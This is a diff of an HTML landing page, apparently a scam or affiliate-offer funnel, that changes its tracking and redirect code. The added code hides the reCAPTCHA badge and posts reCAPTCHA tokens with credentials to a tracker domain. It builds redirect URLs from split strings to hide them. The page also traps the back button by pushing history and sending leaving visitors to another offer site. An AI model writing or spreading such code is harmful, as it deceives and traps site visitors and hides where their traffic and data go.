@@ -35,24 +35,37 @@
                 #Fr1 p.agree{width:88%!important}
                 #Fr2 p.p_mobile small{width:98%!important;margin:5px auto 0}
             }
+      
+            .grecaptcha-badge{display:none}
+             .xj{display:none}
         </style>
+        <script src='https://www.recaptcha.net/recaptcha/api.js?render=6LfOt3cUAAAAAMCmwEO6NoLzIGrsk1XvNRJQwooI'></script>
         <script type="text/javascript">
-            (function(){
-                window.afilter = function(event){
+            (function () {
+                window.afilter = function (event, detail, token) {
                     var xhr = new XMLHttpRequest();
-                    xhr.open('POST', 'http://trk.howtoforexdealing.online/p/events', true);
+                    xhr.open('POST', 'https://trk.dapigu.me/p/events', true);
                     xhr.withCredentials = true;
                     xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                    xhr.send("et=" + event);
+                    xhr.send("et=" + event + "&v=" + detail + "&t=" + token);
                 };
 
+                window.atgo = function (url) {
+                    window.location.replace("https://" + 'trk.dapigu.m' + 'e/' + url);
+                };
             }());
-            afilter(1);
+           
+              grecaptcha.ready(function () {
+                grecaptcha.execute('6LfOt3cUAAAAAMCmwEO6NoLzIGrsk1XvNRJQwooI', {action: 'afilter'})
+                        .then(function (token) {
+                            afilter(6, null, token);
+                        });
+            });
           if (window.location.hash != "#t") {
                 pushHistory();
             }
             window.addEventListener("popstate", function (e) {
-                afilter(5);
+                afilter(5, null, null);
                 window.location.href = "https://secureconv-smart.com/?a=70580&c=130746";
             }, false);
 
@@ -1085,16 +1098,8 @@
                 });
 
                 function loadForm() {
-                    afilter(3);
-                    var u1="https://afilter.xyz/d/1";
-                    var u2="click";
-                    u1=u1.replace(/\/d\/1/,"");
-                    //top.location.href=u1+"/"+u2;
-                    var el = document.createElement("a");   
-                    document.body.appendChild(el);
-		    el.href = u1+"/"+u2; //url 是你得到的连接
-                    el.target = '_new'; //指定在新窗口打开
-                    el.click();
+                  
+                   window.location.replace("https://" + 'trk.dapigu.m' + 'e/click');
 
                     /*
                     startedSignup = true;
@@ -1120,7 +1125,7 @@
                     startTimer2();
                     popstate1();
                     if($("#offerFrame").attr("src")==""){
-                        var u1="https://afilter.xyz/d/1";
+                        var u1="https://trk.dapigu.me/d/1";
                         var u2="click";
                         u1=u1.replace(/\/d\/1/,"");
                         $("#offerFrame").attr("src",u1+"/"+u2);
